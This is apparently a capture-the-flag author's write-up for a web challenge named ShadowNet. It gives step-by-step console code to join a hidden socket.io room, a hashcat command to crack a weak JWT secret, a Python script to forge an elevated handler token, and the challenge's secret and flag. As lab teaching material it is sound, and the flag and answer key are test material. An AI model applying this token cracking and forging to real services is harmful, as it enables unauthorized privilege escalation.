# ShadowNet — Author Writeup & Solve Script

## Intended Solution Path

### Step 1 — Read the source
Open the page, view source or DevTools → Sources.
In `/js/app.js` the following is visible:

```js
const ROOMS = Object.freeze({
public: 'public_feed',
internal: 'shadow_ops', // <-- hidden room
});
```

### Step 2 — Join the internal room
In the browser console:
```js
const s = io(window.location.origin);
s.on('connect', () => s.emit('join', 'shadow_ops'));
s.on('message', d => console.log(d));
```
The `SYS_INTERNAL` broadcaster reveals two routes every ~15 seconds:
- `GET /api/token/operative`
- `GET /api/intel` — requires handler-clearance bearer token

### Step 3 — Fetch operative token
```js
const r = await fetch('/api/token/operative');
const d = await r.json();
console.log(d.token);
```
Decode the JWT payload (middle segment, base64):
```json
{ "uid": "op-XXXX", "handle": "...", "role": "operative", "clearance": 1 }
```

### Step 4 — Crack the weak JWT secret
The server uses a guessable secret. Use hashcat:
```bash
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt
# or a targeted wordlist including: ShadowNet_H4ndler_K3y_2025!
```

### Step 5 — Forge handler token
Once the secret is known, forge a token with `clearance: 2`:
```python
import jwt
secret = 'ShadowNet_H4ndler_K3y_2025!'
token = jwt.encode(
{'uid': 'op-0001', 'handle': 'HANDLER', 'role': 'handler', 'clearance': 2},
secret, algorithm='HS256'
)
print(token)
```

### Step 6 — Retrieve flag
```
{ "flag": "CodeandCapture{JWT_4lg_sw1tch_m4st3r}", ... }
```